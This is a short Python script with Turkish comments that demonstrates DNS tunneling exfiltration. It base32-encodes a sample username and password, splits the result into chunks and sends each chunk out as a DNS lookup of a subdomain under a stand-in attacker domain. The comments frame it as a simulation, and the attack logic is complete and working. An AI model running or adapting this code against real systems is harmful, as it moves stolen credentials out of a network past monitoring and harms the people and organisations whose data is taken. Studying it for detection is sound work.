import base64
import time
import socket

print("--- DNS TUNNELING EXFILTRATION ---")
# Veriyi alacak sunucu (Hacker'ın kontrolünde olmalı)
# Biz burada simüle ediyoruz.
HACKER_DOMAIN = "example.com" 

secret_data = "KullaniciAdi:Admin Sifre:123456"
print(f"Kaçırılacak Veri: {secret_data}")

# Veriyi şifrele ve parçala
encoded = base64.b32encode(secret_data.encode()).decode()
print(f"Encoded: {encoded}")

# 60 karakterlik parçalara böl (DNS limiti)
chunks = [encoded[i:i+60] for i in range(0, len(encoded), 60)]

print("\nVeri DNS üzerinden kaçırılıyor...")

for chunk in chunks:
    # Sahte bir domain oluştur: KODLANMIS_VERI.hacker.com
    fake_domain = f"{chunk}.{HACKER_DOMAIN}"
    
    try:
        print(f"📡 Sorgu atılıyor: {fake_domain}")
        # DNS isteği yap (Veri aslında URL'in içinde gidiyor)
        socket.gethostbyname(fake_domain)
    except:
        # Hata alması normal, çünkü böyle bir domain yok.
        # Amaç isteğin ağdan çıkmasıdır.
        pass
    
    time.sleep(1)

print("\n✅ Tüm veri parçalar halinde gönderildi.")